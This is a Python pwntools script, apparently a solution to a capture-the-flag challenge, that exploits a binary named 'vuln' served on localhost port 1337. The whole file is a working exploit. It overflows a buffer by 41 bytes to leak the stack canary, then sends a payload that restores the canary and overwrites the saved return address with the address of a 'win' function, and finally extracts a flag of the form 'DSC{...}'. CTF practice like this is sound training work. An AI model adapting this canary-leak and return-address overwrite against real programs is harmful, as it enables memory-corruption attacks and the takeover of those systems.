import re
import struct

from pwnlib.context import context
from pwnlib.elf import ELF
from pwnlib.tubes.remote import remote


def main():
    context(arch="amd64")
    vuln = ELF("vuln")

    conn = remote("localhost", 1337)

    # Overflow until canary
    conn.recvuntil(b"Exit\n")
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"41\n")
    conn.recvline()
    conn.send(b"A" * 41)

    # Leak canary
    conn.recvuntil(b"Exit\n")
    conn.send(b"1\n")
    conn.recvuntil(b"A" * 41)
    canary = b"\x00" + conn.recv(7)

    # Overwrite return address
    conn.recvuntil(b"Exit\n")
    conn.send(b"2\n")
    conn.recvline()
    conn.send(b"64\n")
    conn.recvline()
    conn.send(
        b"A" * 40 + canary + struct.pack("<Q", 0xdeadbeefdeadbeef) + struct.pack("<Q", vuln.functions.win.address))

    # Exit
    conn.send(b"3\n")
    flag = re.search(r"DSC\{.+}", conn.recvallS()).group(0)
    print(flag)


if __name__ == '__main__':
    main()
